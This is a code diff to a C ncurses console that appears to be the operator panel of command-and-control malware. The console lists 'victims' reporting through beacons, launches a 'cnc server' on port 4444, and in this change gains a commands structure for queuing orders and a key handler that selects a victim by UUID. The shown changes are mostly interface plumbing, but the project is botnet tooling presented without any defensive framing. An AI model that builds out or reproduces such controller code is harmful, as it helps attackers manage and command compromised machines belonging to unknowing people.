@@ -235,7 +235,7 @@ bool ncurses_item_victims(ITEM **items, net_client_beacon_t **p_victims){
 #define NCURSES_WMAIN
 #endif
 
-bool ncurses_wmain(int action, net_client_beacon_t **p_victims){
+bool ncurses_wmain(int action, net_client_beacon_t **p_victims, net_server_beacon_t **p_commands){
   int y, x;
   if (action == NCURSES_WMAIN_INIT){
     if(putenv("TERM=linux") != 0){
@@ -251,7 +251,7 @@ bool ncurses_wmain(int action, net_client_beacon_t **p_victims){
       fprintf(stderr, "[x] %s\n", strerror(errno));
       return false;
     }
-    if (net_server_async(4444, p_victims) == false){
+    if (net_server_async(4444, p_victims, p_commands) == false){
       fprintf(stderr, "[x] failed to start cnc server!\n");
       return false;
     }
@@ -306,6 +306,7 @@ bool ncurses_wmain(int action, net_client_beacon_t **p_victims){
 #ifndef NCURSES_PTHREAD_REFRESH
 typedef struct{
   net_client_beacon_t **p_victims;
+  net_server_beacon_t **p_commands;
 } ncurses_pthread_refresh_args_t;
 #define NCURSES_PTHREAD_REFRESH
 #endif
@@ -315,7 +316,7 @@ void *ncurses_pthread_refresh(void *args){
   int n_victims = NET_VICTIMS_TOTAL;
   while (true){
     if (n_victims != NET_VICTIMS_TOTAL){
-      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_args->p_victims);
+      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_args->p_victims, p_args->p_commands);
       n_victims = NET_VICTIMS_TOTAL;
     }
   }
@@ -331,23 +332,25 @@ bool ncurses_main(){
   int key;
 
   net_client_beacon_t **p_victims = net_create_victims();
+  net_server_beacon_t **p_commands = net_create_commands();
   
-  ncurses_wmain(NCURSES_WMAIN_INIT, p_victims);
+  ncurses_wmain(NCURSES_WMAIN_INIT, p_victims, p_commands);
 
-  ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims);
+  ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims, p_commands);
 
   pthread_t t_ncurses_pthread_refresh;
   ncurses_pthread_refresh_args_t *p_ncurses_pthread_refresh_args = malloc(sizeof(ncurses_pthread_refresh_args_t));
   p_ncurses_pthread_refresh_args->p_victims = p_victims;
+  p_ncurses_pthread_refresh_args->p_commands = p_commands;
   pthread_create(&t_ncurses_pthread_refresh, NULL, ncurses_pthread_refresh, p_ncurses_pthread_refresh_args);
   
   while(true){
     key = getch();
     if (key == KEY_RESIZE){
-      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims);
+      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims, p_commands);
     }
     if (key == 'r' || key == 'R'){
-      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims);
+      ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims, p_commands);
     }
     if (key == KEY_DOWN){
       menu_driver(menu, REQ_DOWN_ITEM);
@@ -364,6 +367,17 @@ bool ncurses_main(){
     if (key == KEY_PPAGE){
       menu_driver(menu, REQ_SCR_UPAGE);
       wrefresh(win_menu);
+    }
+    if (key == 10 || key == KEY_ENTER){
+      int y, x;
+      getmaxyx(win_main, y, x);
+      ITEM *item;
+      char uuid[SYS_UUID_SIZE];
+      item = current_item(menu);
+      strncpy(uuid, item_name(item), SYS_UUID_SIZE);
+      mvprintw(1, ( x / 2), uuid);
+      refresh();
+      wrefresh(win_main);
     }
   }
   ncurses_menu_cleanup(menu);
